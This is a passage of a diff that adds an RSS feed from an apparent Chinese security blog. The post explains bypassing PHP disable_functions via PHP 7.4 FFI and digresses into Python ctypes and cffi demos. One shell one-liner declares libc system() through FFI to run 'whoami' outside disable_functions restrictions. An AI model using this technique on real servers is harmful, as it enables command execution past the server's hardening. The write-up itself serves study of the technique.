@@ -1,0 +1,295 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>bypass_disable_functions on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/series/bypass_disable_functions/</link><description>Recent content in bypass_disable_functions on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 03 Dec 2021 00:01:07 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/series/bypass_disable_functions/index.xml" rel="self" type="application/rss+xml"/><item><title>FFI绕过disable_functions</title><link>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</link><pubDate>Fri, 03 Dec 2021 00:01:07 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</guid><description>&lt;p>废话不多说，直接进入正题；文中参考链接统一扔后面了&lt;/p>
+&lt;h2 id="preloading">Preloading&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | php7.4启用&lt;/li>
+&lt;/ul>
+&lt;p>预加载文件到opcache中，类不能有不可达的父类、接口，also only top-level entities are not nested with control structures (e.g. if()&amp;hellip;)may be preloaded；被加载后除非重启，进行的修改不影响当前进程；预加载不影响静态类成员和变量的表现；Windows中不能预加载从内部继承的类（Windows ASLR and absence of fork() don&amp;rsquo;t allow to guarantee the same addresses of internal classes in different processes.）；多版本有可能造成bug&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png" alt="image-20211202161008294">&lt;/p>
+&lt;h2 id="ffi">FFI&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | php7.4启用&lt;/li>
+&lt;/ul>
+&lt;p>文档中给了一个小栗子&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#75715e">// create FFI object, loading libc and exporting function printf()
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;int printf(const char *format, ...);&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// this is regular C declaration
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75715e">// call C printf()
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello %s!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接运行即可输出Hello world!；这个函数的原型是这样的&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$cdef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">]])&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>书写的形式相当的简洁，创建FFI对象（声明）-&amp;gt;调用c方法；试着直接执行一个whoami&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#d88200">&amp;#39;$ffi = FFI::cdef(&amp;#34;int system(char *command);&amp;#34;);$ffi-&amp;gt;system(&amp;#34;whoami&amp;#34;);&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现在没有第二个参数的情况下也可以正常执行system函数，看下&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879">源码&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png" alt="image-20211202231908072">&lt;/p>
+&lt;p>这种情况下lib=NULL，handle=RTLD_DEFAULT（这个注释TODO就很灵性）&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png" alt="image-20211202232422896">&lt;/p>
+&lt;p>随后调用&lt;code>DL_FETCH_SYMBOL&lt;/code>，&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168">也就是&lt;/a>dlsysm&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png" alt="image-20211202232601190">&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>RTLD_DEFAULT&lt;/strong>&lt;/p>
+&lt;p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the &lt;strong>RTLD_GLOBAL&lt;/strong>flag.&lt;/p>
+&lt;/blockquote>
+&lt;p>当dlsym第一个参数为RTLD_DEFAULT时，会按照默认共享库顺序查找system的位置，搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 RTLD_GLOBAL还会搜索动态加载库中的函数表），也就是直接在全局符号表里找了，所以不需要指定加载库，fopen这类函数也是一样&lt;/p>
+&lt;p>更多的栗子请参见&lt;a href="https://wiki.php.net/rfc/ffi">文档&lt;/a>和&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇文章&lt;/a>，写的都很详细&lt;/p>
+&lt;h3 id="跑个题ffi-in-python">跑个题：FFI in Python&lt;/h3>
+&lt;p>Python的优点就不必说了，缺点是封装太好了导致运行速度上不去，那为什么不直接在Python中用C/C++呢？&lt;/p>
+&lt;p>肥肠不错的想法！不过要解决的有两个问题：Marshalling（感觉编组这个翻译很奇怪 但是这个行为可以类比一下serialize） &amp;amp; Manageing Memory（内存管理）&lt;/p>
+&lt;ul>
+&lt;li>Python中万物皆object，而C中有严格的int float等等类型&lt;/li>
+&lt;li>Python有gc，而C中需要手动malloc&lt;/li>
+&lt;/ul>
+&lt;p>不过不急，已经有库封装好了这些功能可以直接使用，来康康demo&lt;/p>
+&lt;h4 id="ctypes库">ctypes库&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>
+&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#75af00">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;In cadd: int %d float %.1f returning %.1f&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#75715e"># load the lib&lt;/span>
+&lt;span style="color:#111">libname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Path&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">absolute&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#d88200">&amp;#34;libcadd.so&amp;#34;&lt;/span>
+&lt;span style="color:#111">c_lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">libname&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.3&lt;/span>
+&lt;span style="color:#75715e"># define the return type&lt;/span>
+&lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>
+&lt;span style="color:#75715e"># call the function with the correct argument types&lt;/span>
+&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;In python: int: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> float &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> return val &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
+$ python3 test.py
+In cadd: int &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 returning 8.3
+In python: int: &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 &lt;span style="color:#00a8c8">return&lt;/span> val 8.3
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png" alt="image-20211202173119818">&lt;/p>
+&lt;p>可以看到成功调用了cadd.so，而我们在python中要做的只有加载.so-&amp;gt;设置符合C标准的返回值类型-&amp;gt;调用，肥肠的简单&lt;/p>
+&lt;p>不过标准库ctypes有一些缺陷 并且不能拓展大型项目，鉴于此我们可以使用cffi库&lt;/p>
+&lt;h4 id="cffi库">cffi库&lt;/h4>
+&lt;p>这里是一个hello world的小demo&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
+&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#75715e"># 可以定义函数 结构体 变量&lt;/span>
+&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;span style="color:#d88200"> int printf(const char *format, ...);
+&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 加载c命名空间&lt;/span>
+&lt;span style="color:#111">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;char[]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 即 char arg[]=&amp;#34;world&amp;#34;;&lt;/span>
+&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arg&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个栗子里直接在一个py文件中用cffi调用库函数就结束了，肥肠肥肠的简单；或者也可以和ctypes一样，单独写一个c先&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">Tprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello, world&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后调用&lt;code>ffi.verify()&lt;/code>在Python中加载和使用，不过还需要额外声明函数&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
+&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;span style="color:#d88200"> int Tadd(int a, int b);
+&lt;/span>&lt;span style="color:#d88200"> void Tprint(void);
+&lt;/span>&lt;span style="color:#d88200"> int Tmul(int a, int b);
+&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sources&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uu.c&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tprint&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png" alt="image-20211202180822923">&lt;/p>
+&lt;p>以上方式都是在线api模式，cffi还支持离线api模式，比如下面这个demo&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
+&lt;span style="color:#111">ffibuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;span style="color:#d88200"> double sqrt(double x);
+&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75715e"># 需要的头文件&lt;/span>
+&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_libmath&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;span style="color:#d88200"> #include &amp;lt;math.h&amp;gt;
+&lt;/span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">library_dirs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[],&lt;/span>
+&lt;span style="color:#111">libraries&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">verbose&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python build_cffi.py
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">_libmath&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">lib&lt;/span>
+&lt;span style="color:#75715e"># 直接调用c函数&lt;/span>
+&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sqrt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">F&lt;/span>&lt;span style="color:#d88200">&amp;#34;The square root of 4.5 is &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python test.py
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png" alt="image-20211202173047579">&lt;/p>
+&lt;p>可以看到这里先用一个py文件调用.h来编译生成.so和.c，然后在另一个py文件中调用.c即可&lt;/p>
+&lt;p>或者还有第三种方式，在Python中使用外部已经定义好的c库函数；这里使用&lt;a href="https://github.com/wolever">wolever&lt;/a>/&lt;a href="https://github.com/wolever/python-cffi-example">python-cffi-example&lt;/a>来演示（&lt;del>就不复制粘贴了捏&lt;/del> 就粘就粘&lt;/p>
+&lt;p>首先是一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18">fnmatch.h&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png" alt="image-20211202184827657">&lt;/p>
+&lt;p>注意7 8 9行要改一下的，根据/usr/include/fnmatch.h改&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png" alt="image-20211202185217525">&lt;/p>
+&lt;p>这是&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1">build_fnmatch.py&lt;/a>，用于生成模块在fnmatch.py中使用&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
+&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
